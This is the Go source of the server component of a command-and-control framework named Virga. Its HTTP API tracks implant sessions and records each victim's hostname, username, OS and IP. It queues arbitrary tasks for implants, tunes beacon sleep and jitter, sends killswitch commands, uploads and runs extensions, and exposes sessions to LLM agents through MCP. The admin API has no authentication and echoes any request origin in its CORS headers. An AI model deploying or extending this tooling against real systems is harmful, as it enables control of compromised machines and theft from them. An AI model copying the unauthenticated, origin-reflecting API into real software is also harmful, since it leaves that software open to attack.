package server

import (
	"context"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/r74tech/virga/internal/server/beacons"
	"github.com/r74tech/virga/internal/server/config"
	"github.com/r74tech/virga/internal/server/database"
	"github.com/r74tech/virga/internal/server/extensions"
	"github.com/r74tech/virga/internal/server/listener"
	"github.com/r74tech/virga/internal/server/mcp"
	mcpconfig "github.com/r74tech/virga/internal/server/mcp/config"
	"github.com/r74tech/virga/internal/server/protocol"
	"github.com/r74tech/virga/internal/server/session"
	"github.com/r74tech/virga/internal/shared/logger"
	sharedprotocol "github.com/r74tech/virga/internal/shared/protocol"
)

// generateUUID generates a UUID v4
func generateUUID() string {
	uuid := make([]byte, 16)
	_, err := rand.Read(uuid)
	if err != nil {
		// If an error occurs, use a simple fallback
		return fmt.Sprintf("%d", time.Now().UnixNano())
	}

	// Set the UUID version and variant
	uuid[6] = (uuid[6] & 0x0f) | 0x40 // Version 4
	uuid[8] = (uuid[8] & 0x3f) | 0x80 // Variant 1

	return fmt.Sprintf("%x-%x-%x-%x-%x", uuid[0:4], uuid[4:6], uuid[6:8], uuid[8:10], uuid[10:])
}

// Server is the main structure for the Virga C2 server
type Server struct {
	config           *config.Config
	db               *database.Database
	listeners        []listener.Listener
	sessions         map[string]*session.Session
	sessionsMu       sync.RWMutex
	stopping         bool
	wg               sync.WaitGroup
	debugMode        bool // Add debug mode flag
	apiRouter        *mux.Router
	apiServer        *http.Server
	sessionManager   *session.Manager
	beaconManager    *beacons.Manager
	mcpManager       *mcp.Manager
	extensionManager *extensions.Manager
	log              logger.Logger

	// Listener management
	listenerConfigs map[string]config.ListenerConfig
	listenerStatus  map[string]string
	listenersMu     sync.RWMutex
}

// NewServer creates a new C2 server instance
func NewServer(cfg *config.Config, db *database.Database) *Server {
	// Initialize API router
	apiRouter := mux.NewRouter()

	// Build Admin API address from config
	adminAddr := fmt.Sprintf("%s:%d", cfg.Server.Host, cfg.Server.AdminPort)

	apiServer := &http.Server{
		Addr:    adminAddr, // Admin API address from config
		Handler: apiRouter,
	}

	// Initialize managers
	sessionManager := session.NewManager()
	beaconManager := beacons.NewManager()

	// Initialize extension storage
	extensionStoragePath := "/tmp/virga/extensions" // TODO: Make this configurable

	var extensionStorage extensions.Storage
	fsStorage, err := extensions.NewFileSystemStorage(extensionStoragePath)
	log := logger.NewLogger("Server")
	if err != nil {
		log.Error("Failed to create file system storage: %v, using memory storage", err)
		extensionStorage = extensions.NewMemoryStorage()
	} else {
		extensionStorage = fsStorage
	}

	extensionManager := extensions.NewManager(db, extensionStorage, sessionManager)

	s := &Server{
		config:           cfg,
		db:               db,
		listeners:        []listener.Listener{},
		sessions:         make(map[string]*session.Session),
		apiRouter:        apiRouter,
		apiServer:        apiServer,
		debugMode:        false,
		sessionManager:   sessionManager,
		beaconManager:    beaconManager,
		extensionManager: extensionManager,
		log:              log,

		// Initialize listener management
		listenerConfigs: make(map[string]config.ListenerConfig),
		listenerStatus:  make(map[string]string),
	}

	// Register listeners from config
	for _, listenerCfg := range cfg.Listeners {
		s.listenerConfigs[listenerCfg.Name] = listenerCfg
		s.listenerStatus[listenerCfg.Name] = "stopped" // Initial state
	}

	// Initialize MCP server
	if cfg.MCP.Enabled {
		s.log.Info("MCP is enabled in config, initializing...")
		mcpConfig := &mcpconfig.Config{
			Name:              "Virga MCP Server",
			Version:           "1.0.0",
			SSEEnabled:        cfg.MCP.SSEEnabled,
			SSEPort:           cfg.MCP.SSEPort,
			SSEBasePath:       cfg.MCP.SSEBasePath,
			StdioEnabled:      cfg.MCP.StdioEnabled,
			StreamableEnabled: cfg.MCP.StreamableEnabled,
			StreamablePort:    cfg.MCP.StreamablePort,
		}
		if cfg.MCP.RemoteEnabled {
			mcpConfig.SSERemoteURL = cfg.MCP.RemoteBaseURL
		}

		mcpManager, err := mcp.NewManager(mcpConfig, beaconManager, sessionManager, db)
		if err != nil {
			s.log.Error("Failed to create MCP manager: %v", err)
			// Continue even if MCP manager initialization fails
		} else {
			s.mcpManager = mcpManager
			s.log.Info("MCP manager initialized successfully")
		}
	} else {
		s.log.Info("MCP is disabled in config")
	}

	return s
}

// SetDebugMode enables/disables debug mode
func (s *Server) SetDebugMode(debug bool) {
	s.debugMode = debug
	if debug {
		s.log.SetLevel(logger.DEBUG)
		s.log.Debug("Server debug mode enabled")
	} else {
		s.log.SetLevel(logger.INFO)
	}
}

// IsDebugMode returns the debug mode state
func (s *Server) IsDebugMode() bool {
	return s.debugMode
}

// AddListener adds a new listener to the server
func (s *Server) AddListener(l listener.Listener) error {
	s.listeners = append(s.listeners, l)
	if s.debugMode {
		s.log.Debug("Listener added: %s", l.Name())
	}
	return nil
}

// corsMiddleware handles CORS for API requests
func (s *Server) corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Allow requests from local development server
		origin := r.Header.Get("Origin")
		if origin != "" {
			w.Header().Set("Access-Control-Allow-Origin", origin)
			w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
			w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
			w.Header().Set("Access-Control-Max-Age", "86400")
		}

		// Handle preflight requests
		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}

		next.ServeHTTP(w, r)
	})
}

// initAPIRoutes initializes the API routes
func (s *Server) initAPIRoutes() {
	// Apply CORS middleware
	s.apiRouter.Use(s.corsMiddleware)

	// Session information API
	s.apiRouter.HandleFunc("/api/sessions", s.handleGetSessions).Methods("GET", "OPTIONS")

	// Session command related API
	s.apiRouter.HandleFunc("/api/sessions/{id}/tasks", s.handleAddTask).Methods("POST", "OPTIONS")
	s.apiRouter.HandleFunc("/api/sessions/{id}/tasks/{taskID}", s.handleGetTaskResult).Methods("GET", "OPTIONS")
	s.apiRouter.HandleFunc("/api/sessions/{id}/tasks", s.handleGetTaskResults).Methods("GET", "OPTIONS")
	s.apiRouter.HandleFunc("/api/sessions/{id}/tasks/{taskID}/progress", s.handleGetTaskProgress).Methods("GET", "OPTIONS")
	s.apiRouter.HandleFunc("/api/sessions/{id}/tasks/{taskID}/progress", s.handleUpdateTaskProgress).Methods("POST", "OPTIONS")

	// Chat API
	s.apiRouter.HandleFunc("/api/sessions/{id}/chat", s.handleChat).Methods("POST", "OPTIONS")

	// Interactive mode setting API (added)
	s.apiRouter.HandleFunc("/api/sessions/{id}/interactive", s.handleSetInteractiveMode).Methods("POST", "OPTIONS")

	// Beacon configuration API
	s.apiRouter.HandleFunc("/api/sessions/{id}/beacon-config", s.handleUpdateBeaconConfig).Methods("POST", "OPTIONS")

	// Killswitch API
	s.apiRouter.HandleFunc("/api/sessions/{id}/killswitch", s.handleKillswitch).Methods("POST", "OPTIONS")

	// Extension management API
	s.apiRouter.HandleFunc("/api/sessions/{id}/extensions", s.handleUploadExtension).Methods("POST", "OPTIONS")
	s.apiRouter.HandleFunc("/api/sessions/{id}/extensions", s.handleListExtensions).Methods("GET", "OPTIONS")
	s.apiRouter.HandleFunc("/api/sessions/{id}/extensions/{name}/execute", s.handleExecuteExtension).Methods("POST", "OPTIONS")
	s.apiRouter.HandleFunc("/api/sessions/{id}/extensions/{name}", s.handleDeleteExtension).Methods("DELETE", "OPTIONS")

	// Other API endpoints
	s.apiRouter.HandleFunc("/api/listeners", s.handleGetListeners).Methods("GET", "OPTIONS")
	s.apiRouter.HandleFunc("/api/listeners", s.handleCreateListener).Methods("POST", "OPTIONS")
	s.apiRouter.HandleFunc("/api/listeners/{name}", s.handleDeleteListener).Methods("DELETE", "OPTIONS")

	// Forest (network topology) API
	s.apiRouter.HandleFunc("/api/forest", s.handleGetForest).Methods("GET", "OPTIONS")

	// Authentication handler (in actual implementation, apply authentication middleware)
}

// handleSetInteractiveMode sets
func (s *Server) handleSetInteractiveMode(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]

	if s.debugMode {
		s.log.Debug("API request: POST /api/sessions/%s/interactive from %s",
			sessionID, r.RemoteAddr)
	}

	// Parse request body
	var request struct {
		Interactive bool `json:"interactive"`
	}

	if err := json.NewDecoder(r.Body).Decode(&request); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Invalid request format",
		})
		return
	}

	// Get session
	s.sessionsMu.RLock()
	sess, exists := s.sessions[sessionID]
	s.sessionsMu.RUnlock()

	if !exists {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Session not found",
		})
		return
	}

	// Set interactive mode
	sess.SetInteractive(request.Interactive)

	if s.debugMode {
		s.log.Debug("Session %s interactive mode set to %v", sessionID, request.Interactive)
	}

	// Success response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Interactive mode updated",
	})
}

// handleUpdateBeaconConfig updates the beacon configuration for a session
func (s *Server) handleUpdateBeaconConfig(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]

	if s.debugMode {
		s.log.Debug("API request: POST /api/sessions/%s/beacon-config from %s",
			sessionID, r.RemoteAddr)
	}

	// Parse request body
	var request struct {
		SleepTime int `json:"sleep_time"`
		Jitter    int `json:"jitter"`
	}

	if err := json.NewDecoder(r.Body).Decode(&request); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Invalid request format",
		})
		return
	}

	// Validate values
	if request.SleepTime < 1 {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Sleep time must be at least 1 second",
		})
		return
	}

	if request.Jitter < 0 || request.Jitter > 50 {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Jitter must be between 0 and 50 percent",
		})
		return
	}

	// Update beacon configuration
	if err := s.beaconManager.UpdateBeaconConfig(sessionID, request.SleepTime, request.Jitter); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": fmt.Sprintf("Failed to update beacon config: %v", err),
		})
		return
	}

	if s.debugMode {
		s.log.Debug("Beacon config updated for session %s: sleep_time=%d, jitter=%d",
			sessionID, request.SleepTime, request.Jitter)
	}

	// Success response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Beacon configuration updated",
		"config": map[string]interface{}{
			"sleep_time": request.SleepTime,
			"jitter":     request.Jitter,
		},
	})
}

// handleKillswitch activates the killswitch for a session
func (s *Server) handleKillswitch(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]

	if s.debugMode {
		s.log.Debug("API request: POST /api/sessions/%s/killswitch from %s",
			sessionID, r.RemoteAddr)
	}

	// Parse request body
	var request struct {
		Mode    string `json:"mode"`    // "shutdown" or "remove"
		Message string `json:"message"` // Optional message
		Confirm bool   `json:"confirm"` // Confirmation flag
	}

	if err := json.NewDecoder(r.Body).Decode(&request); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Invalid request format",
		})
		return
	}

	// Require explicit confirmation
	if !request.Confirm {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Killswitch requires explicit confirmation (confirm: true)",
		})
		return
	}

	// Validate mode
	if request.Mode != "shutdown" && request.Mode != "remove" {
		request.Mode = "shutdown" // Default to shutdown
	}

	// Get session
	s.sessionsMu.RLock()
	sess, exists := s.sessions[sessionID]
	s.sessionsMu.RUnlock()

	if !exists {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Session not found",
		})
		return
	}

	// Create killswitch task
	taskID := generateUUID()
	now := time.Now()
	task := protocol.Task{
		ID:        taskID,
		TaskID:    taskID,
		Type:      protocol.TaskType("killswitch"),
		SessionID: sessionID,
		Payload: map[string]interface{}{
			"mode":    request.Mode,
			"message": request.Message,
		},
		Arguments: map[string]interface{}{
			"mode":    request.Mode,
			"message": request.Message,
		},
		CreatedAt: now,
		SentTime:  now,
		Status:    protocol.TaskStatusPending,
	}

	sess.AddTask(task)

	// Log critical event to database
	if s.db != nil {
		payloadJSON, _ := json.Marshal(task.Payload)
		commandID, err := s.db.LogCommand(sessionID, "killswitch", string(payloadJSON))
		if err != nil {
			s.log.Error("Failed to log killswitch command: %v", err)
		} else {
			sess.SetTaskCommandMapping(task.TaskID, commandID)

			metadata := map[string]interface{}{
				"created_at": task.CreatedAt,
				"status":     task.Status,
				"mode":       request.Mode,
				"message":    request.Message,
			}
			if err := s.db.SaveTaskMetadata(commandID, task.TaskID, "killswitch", 10, metadata); err != nil {
				s.log.Error("Failed to save killswitch metadata: %v", err)
			}
		}
	}

	s.log.Warn("Killswitch activated for session %s (mode: %s)", sessionID, request.Mode)

	// Success response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": fmt.Sprintf("Killswitch activated (mode: %s)", request.Mode),
		"task_id": taskID,
		"mode":    request.Mode,
	})
}

// handleChat handles chat message requests
func (s *Server) handleChat(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]

	if s.debugMode {
		s.log.Debug("API request: POST /api/sessions/%s/chat from %s",
			sessionID, r.RemoteAddr)
	}

	// Parse request body
	var request struct {
		Message string `json:"message"`
		Options struct {
			MaxIterations int     `json:"maxIterations"`
			Temperature   float64 `json:"temperature"`
		} `json:"options"`
	}

	if err := json.NewDecoder(r.Body).Decode(&request); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Invalid request format",
		})
		return
	}

	// Validate message
	if request.Message == "" {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Message required",
		})
		return
	}

	// Set default values
	if request.Options.MaxIterations == 0 {
		request.Options.MaxIterations = 5
	}
	if request.Options.Temperature == 0 {
		request.Options.Temperature = 0.3
	}

	// Get session
	s.sessionsMu.RLock()
	sess, exists := s.sessions[sessionID]
	s.sessionsMu.RUnlock()

	if !exists {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Session not found",
		})
		return
	}

	// Create llama_interactive task
	taskID := generateUUID()
	now := time.Now()
	task := protocol.Task{
		ID:        taskID,
		TaskID:    taskID,
		Type:      protocol.TaskType("llama_interactive"),
		SessionID: sessionID,
		Payload: map[string]interface{}{
			"prompt":         request.Message,
			"max_iterations": request.Options.MaxIterations,
			"temperature":    request.Options.Temperature,
		},
		Arguments: map[string]interface{}{
			"prompt":         request.Message,
			"max_iterations": request.Options.MaxIterations,
			"temperature":    request.Options.Temperature,
		},
		CreatedAt: now,
		SentTime:  now,
		Status:    protocol.TaskStatusPending,
	}

	// Add task to session
	sess.AddTask(task)

	// Log to database
	if s.db != nil {
		payloadJSON, _ := json.Marshal(task.Payload)
		commandID, err := s.db.LogCommand(sessionID, "llama_interactive", string(payloadJSON))
		if err != nil {
			s.log.Error("Failed to log chat command: %v", err)
		} else {
			sess.SetTaskCommandMapping(task.TaskID, commandID)

			metadata := map[string]interface{}{
				"created_at": task.CreatedAt,
				"status":     task.Status,
				"message":    request.Message,
			}
			if err := s.db.SaveTaskMetadata(commandID, task.TaskID, "llama_interactive", 5, metadata); err != nil {
				s.log.Error("Failed to save chat metadata: %v", err)
			}
		}
	}

	if s.debugMode {
		s.log.Debug("Chat task %s added to session %s",
			task.TaskID, sessionID)
	}

	// Success response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"taskId":  task.TaskID,
		"status":  "queued",
	})
}

// handleGetSessions is the session list API handler
func (s *Server) handleGetSessions(w http.ResponseWriter, r *http.Request) {
	if s.debugMode {
		s.log.Debug("API request: GET /api/sessions from %s", r.RemoteAddr)
	}

	s.sessionsMu.RLock()

	// Define response format
	type SessionInfo struct {
		ID           string                 `json:"id"`
		RemoteAddr   string                 `json:"remote_addr"`
		Hostname     string                 `json:"hostname"`
		Username     string                 `json:"username"`
		OS           string                 `json:"os"`
		LastActivity time.Time              `json:"last_activity"`
		Environment  map[string]interface{} `json:"environment"`
		Interval     int                    `json:"interval"`
		Jitter       int                    `json:"jitter"`
	}

	// Collect session information
	sessionInfos := make([]SessionInfo, 0, len(s.sessions))
	for id, sess := range s.sessions {
		info := sess.GetInformation()

		// Default values
		hostname := "unknown"
		username := "unknown"
		osInfo := "unknown"

		// Get information
		if h, ok := info["hostname"].(string); ok {
			hostname = h
		}
		if u, ok := info["username"].(string); ok {
			username = u
		}
		if o, ok := info["os"].(string); ok {
			osInfo = o
		}

		// Get beacon config for this session
		interval := 30 // Default
		jitter := 20   // Default
		if beaconConfig, err := s.beaconManager.GetBeaconConfig(id); err == nil {
			interval = beaconConfig.SleepTime
			jitter = beaconConfig.Jitter
		}

		// Extract IP address from RemoteAddr (remove port)
		remoteAddr := sess.RemoteAddr()
		ip := remoteAddr
		if host, _, err := net.SplitHostPort(remoteAddr); err == nil {
			ip = host
		}

		// Override environment IP with the actual remote address
		if info == nil {
			info = make(map[string]interface{})
		}
		info["ip"] = ip

		sessionInfo := SessionInfo{
			ID:           id,
			RemoteAddr:   remoteAddr,
			Hostname:     hostname,
			Username:     username,
			OS:           osInfo,
			LastActivity: sess.LastSeen(),
			Environment:  info,
			Interval:     interval,
			Jitter:       jitter,
		}

		sessionInfos = append(sessionInfos, sessionInfo)
	}

	s.sessionsMu.RUnlock()

	// Create JSON response
	response := map[string]interface{}{
		"success":  true,
		"sessions": sessionInfos,
	}

	// JSON encode
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(response); err != nil {
		s.log.Error("Error encoding sessions response: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	if s.debugMode {
		s.log.Debug("Returned %d sessions via API", len(sessionInfos))
	}
}

// handleAddTask is the task add API handler
func (s *Server) handleAddTask(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]

	if s.debugMode {
		s.log.Debug("API request: POST /api/sessions/%s/tasks from %s",
			sessionID, r.RemoteAddr)
	}

	// Get session
	s.sessionsMu.RLock()
	sess, exists := s.sessions[sessionID]
	s.sessionsMu.RUnlock()

	if !exists {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Session not found",
		})
		return
	}

	// Parse request body
	var taskRequest struct {
		Type    string                 `json:"type"`
		Payload map[string]interface{} `json:"payload"`
	}

	if err := json.NewDecoder(r.Body).Decode(&taskRequest); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Invalid request format",
		})
		return
	}

	// Create and add task
	taskID := generateUUID()
	now := time.Now()
	task := protocol.Task{
		ID:        taskID,
		TaskID:    taskID, // For compatibility
		Type:      protocol.TaskType(taskRequest.Type),
		SessionID: sessionID,
		Payload:   taskRequest.Payload,
		Arguments: taskRequest.Payload,
		CreatedAt: now,
		SentTime:  now,
		Status:    protocol.TaskStatusPending,
	}

	sess.AddTask(task)

	// Log task to database
	if s.db != nil {
		// Convert payload to JSON string for database storage
		payloadJSON, _ := json.Marshal(taskRequest.Payload)
		commandID, err := s.db.LogCommand(sessionID, string(task.Type), string(payloadJSON))
		if err != nil {
			s.log.Error("Failed to log command to database: %v", err)
		} else {
			// Store the mapping between task ID and command ID for later use
			sess.SetTaskCommandMapping(task.TaskID, commandID)

			// Save task metadata
			metadata := map[string]interface{}{
				"created_at": task.CreatedAt,
				"status":     task.Status,
			}
			if err := s.db.SaveTaskMetadata(commandID, task.TaskID, string(task.Type), 5, metadata); err != nil {
				s.log.Error("Failed to save task metadata: %v", err)
			}
		}
	}

	if s.debugMode {
		s.log.Debug("Task %s added to session %s (type: %s)",
			task.TaskID, sessionID, task.Type)
	}

	// Success response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"task_id": task.TaskID,
		"message": "Task added to queue",
	})
}

// handleGetTaskResult is the task result API handler
func (s *Server) handleGetTaskResult(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]
	taskID := vars["taskID"]

	if s.debugMode {
		s.log.Debug("API request: GET /api/sessions/%s/tasks/%s from %s",
			sessionID, taskID, r.RemoteAddr)
	}

	// Get session
	s.sessionsMu.RLock()
	sess, exists := s.sessions[sessionID]
	s.sessionsMu.RUnlock()

	if !exists {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Session not found",
		})
		return
	}

	// Get task results - collect all results for this task ID
	results := sess.GetTaskResults()
	var taskResults []protocol.TaskResult
	var finalResult *protocol.TaskResult

	for i, result := range results {
		if result.TaskID == taskID {
			taskResults = append(taskResults, result)
			// Track final result (non-partial)
			if !result.Partial {
				finalResult = &results[i]
			}
		}
	}

	if len(taskResults) > 0 {
		// If we have a final result, task is complete
		if finalResult != nil {
			status := "completed"
			if finalResult.Error != "" || finalResult.ExitCode != 0 {
				status = "failed"
			}

			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]interface{}{
				// CLI compatible fields (DO NOT CHANGE)
				"success":     true,
				"task_id":     finalResult.TaskID,
				"output":      finalResult.Output,
				"exit_code":   finalResult.ExitCode,
				"error":       finalResult.Error,
				"time":        finalResult.Time,
				"is_complete": true,

				// Web UI extensions (optional, CLI will ignore)
				"status":          status,
				"partial_results": taskResults, // All results including partial
			})
			return
		}

		// Task is running with partial results
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			// CLI compatible fields
			"success":     true,
			"task_id":     taskID,
			"output":      "",
			"exit_code":   0,
			"error":       "",
			"time":        time.Now(),
			"is_complete": false,

			// Web UI extensions
			"status":          "running",
			"partial_results": taskResults, // Partial results available
		})
		return
	}

	// Check if task is still running (no results yet)
	if sess.IsTaskPending(taskID) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			// CLI compatible fields
			"success":     true,
			"task_id":     taskID,
			"output":      "",
			"exit_code":   0,
			"error":       "",
			"time":        time.Now(),
			"is_complete": false,

			// Web UI extensions
			"status":          "running",
			"partial_results": []protocol.TaskResult{},
		})
		return
	}

	// Task not found (404)
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusNotFound)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": false,
		"message": "Task result not found",
	})
}

// handleGetTaskResults is the task results API handler
func (s *Server) handleGetTaskResults(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]

	if s.debugMode {
		s.log.Debug("API request: GET /api/sessions/%s/tasks from %s",
			sessionID, r.RemoteAddr)
	}

	// Get session
	s.sessionsMu.RLock()
	sess, exists := s.sessions[sessionID]
	s.sessionsMu.RUnlock()

	if !exists {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Session not found",
		})
		return
	}

	// Get task results
	results := sess.GetTaskResults()

	// Return result
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"results": results,
	})
}

// handleGetTaskProgress is the task progress API handler
func (s *Server) handleGetTaskProgress(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]
	taskID := vars["taskID"]

	if s.debugMode {
		s.log.Debug("API request: GET /api/sessions/%s/tasks/%s/progress from %s",
			sessionID, taskID, r.RemoteAddr)
	}

	// Get session
	s.sessionsMu.RLock()
	sess, exists := s.sessions[sessionID]
	s.sessionsMu.RUnlock()

	if !exists {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Session not found",
		})
		return
	}

	// Get progress information
	progress := sess.GetTaskProgress(taskID)

	// Return result
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success":  true,
		"task_id":  taskID,
		"progress": progress, // nil if no progress available
	})
}

// handleUpdateTaskProgress is the task progress update API handler (for beacon progress reporting)
func (s *Server) handleUpdateTaskProgress(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["id"]
	taskID := vars["taskID"]

	if s.debugMode {
		s.log.Debug("API request: POST /api/sessions/%s/tasks/%s/progress from %s",
			sessionID, taskID, r.RemoteAddr)
	}

	// Parse request body
	var request struct {
		CurrentIteration int      `json:"current_iteration"`
		MaxIterations    int      `json:"max_iterations"`
		IterationOutputs []string `json:"iteration_outputs"`
	}

	if err := json.NewDecoder(r.Body).Decode(&request); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Invalid request format",
		})
		return
	}

	// Get session
	s.sessionsMu.RLock()
	sess, exists := s.sessions[sessionID]
	s.sessionsMu.RUnlock()

	if !exists {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"message": "Session not found",
		})
		return
	}

	// Update progress
	progress := &sharedprotocol.TaskProgress{
		CurrentIteration: request.CurrentIteration,
		MaxIterations:    request.MaxIterations,
		LastUpdate:       time.Now().Unix(),
		IterationOutputs: request.IterationOutputs,
	}

	sess.UpdateTaskProgress(taskID, progress)

	if s.debugMode {
		s.log.Debug("Progress updated for task %s: %d/%d", taskID, request.CurrentIteration, request.MaxIterations)
	}

	// Return success
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Progress updated",
	})
}

// handleGetListeners is the listener list API handler
func (s *Server) handleGetListeners(w http.ResponseWriter, r *http.Request) {
	s.listenersMu.RLock()
	defer s.listenersMu.RUnlock()

	// Collect listener information
	type ListenerInfo struct {
		Name        string `json:"name"`
		Type        string `json:"type"`
		BindAddress string `json:"bind_address"`
		Port        int    `json:"port"`
		Status      string `json:"status"`
	}

	listenerInfos := make([]ListenerInfo, 0, len(s.listeners))

	for _, l := range s.listeners {
		name := l.Name()

		// Get configuration
		cfg, cfgExists := s.listenerConfigs[name]
		if !cfgExists {
			s.log.Warn("Listener config not found for: %s", name)
			continue
		}

		// Get status (default is "running")
		status, statusExists := s.listenerStatus[name]
		if !statusExists {
			status = "running"
		}

		listenerInfos = append(listenerInfos, ListenerInfo{
			Name:        name,
			Type:        cfg.Type,
			BindAddress: cfg.BindAddress,
			Port:        cfg.Port,
			Status:      status,
		})
	}

	// Create JSON response
	response := map[string]interface{}{
		"success":   true,
		"listeners": listenerInfos,
	}

	// JSON encode
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(response); err != nil {
		s.log.Error("Error encoding listeners response: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
}

// handleGetForest is the forest (network topology) API handler
func (s *Server) handleGetForest(w http.ResponseWriter, r *http.Request) {
	type NodeInfo struct {
		ID         string                 `json:"id"`
		Type       string                 `json:"type"`
		Label      string                 `json:"label"`
		Status     string                 `json:"status"`
		Properties map[string]interface{} `json:"properties"`
		CreatedAt  string                 `json:"createdAt"`
		UpdatedAt  string                 `json:"updatedAt"`
	}

	type EdgeInfo struct {
		ID         string                 `json:"id"`
		Source     string                 `json:"source"`
		Target     string                 `json:"target"`
		Type       string                 `json:"type"`
		Label      string                 `json:"label"`
		Properties map[string]interface{} `json:"properties"`
		CreatedAt  string                 `json:"createdAt"`
	}

	// Build graph from active sessions
	s.sessionsMu.RLock()
	defer s.sessionsMu.RUnlock()

	nodes := []NodeInfo{}
	edges := []EdgeInfo{}

	// Add C2 server node
	// Get server's hostname
	serverHostname, _ := os.Hostname()
	if serverHostname == "" {
		serverHostname = "virga-c2"
	}

	// Get server's IP address (same logic as implant)
	serverIP := "127.0.0.1"
	if addrs, err := net.InterfaceAddrs(); err == nil {
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipv4 := ipnet.IP.To4(); ipv4 != nil {
					serverIP = ipv4.String()
					break
				}
			}
		}
	}

	c2Node := NodeInfo{
		ID:     "c2-server",
		Type:   "system",
